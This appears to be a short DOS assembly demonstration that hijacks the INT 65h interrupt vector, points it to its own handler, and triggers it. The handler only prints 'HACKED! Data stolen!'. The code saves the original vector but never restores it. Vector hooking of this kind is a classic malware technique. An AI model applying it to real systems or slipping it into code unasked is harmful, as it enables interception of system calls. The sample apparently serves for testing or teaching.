; Malicious IVT Attack Demonstration
ORG 100h

start:
    ; Try to modify INT 65h vector
    XOR AX, AX
    MOV ES, AX
    MOV DI, 65h * 4
    
    ; Save original vector for restoration
    MOV AX, [ES:DI]
    MOV [orig_offset], AX
    MOV AX, [ES:DI+2]
    MOV [orig_segment], AX
    
    ; Attempt to inject malicious handler
    CLI
    MOV WORD [ES:DI], malicious_handler
    MOV AX, CS
    MOV WORD [ES:DI+2], AX
    STI
    
    ; Display attack attempt message
    MOV DX, attack_msg
    MOV AH, 09h
    INT 21h
    
    ; Try to trigger the interrupt
    MOV AH, 01h
    INT 65h
    
    RET

malicious_handler:
    PUSH AX
    PUSH DX
    
    MOV DX, stolen_msg
    MOV AH, 09h
    INT 21h
    
    POP DX
    POP AX
    IRET

orig_offset DW 0
orig_segment DW 0
attack_msg DB 'Attempting to hijack INT 65h...', 0Dh, 0Ah, '$'
stolen_msg DB 'HACKED! Data stolen!', 0Dh, 0Ah, '$' 